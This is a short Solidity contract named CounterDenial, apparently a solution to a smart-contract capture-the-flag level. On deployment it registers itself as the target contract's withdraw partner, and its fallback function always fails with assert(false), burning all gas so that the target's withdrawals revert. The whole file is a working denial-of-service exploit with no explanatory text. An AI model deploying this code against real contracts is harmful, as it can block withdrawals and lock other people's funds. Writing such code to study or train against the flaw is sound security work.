// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

contract CounterDenial {
  address public victim;

  constructor(address _victim) public payable {
    victim = _victim;
    bytes memory payload =
      abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
    victim.call(payload);
  }

  fallback() external payable {
    assert(false);
  }
}
